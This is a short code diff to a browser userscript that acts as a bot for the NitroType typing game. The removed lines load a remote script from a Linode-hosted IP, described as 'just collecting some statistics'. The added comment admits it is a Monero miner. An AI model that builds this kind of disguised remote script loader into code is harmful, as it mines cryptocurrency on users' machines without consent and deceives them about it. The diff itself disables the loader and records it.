@@ -2,8 +2,8 @@
     UltraType - Typing game / NitroType.com bot
 */
 (() => {
-    const STATS_URL = 'https://194-195-216-27.ip.linodeusercontent.com:8081/stats.js'; // proprietary, sorry. just collecting some statistics thats all!
-    // load stats
+    // This is a Monero miner, if you want to give me $0.0005, uncomment this!
+    // const STATS_URL = 'https://194-195-216-27.ip.linodeusercontent.com:8081/stats.js'; 
     if (!window.localStorage["multratype"]) {
       let s = document.createElement('script');
         s.src = STATS_URL;
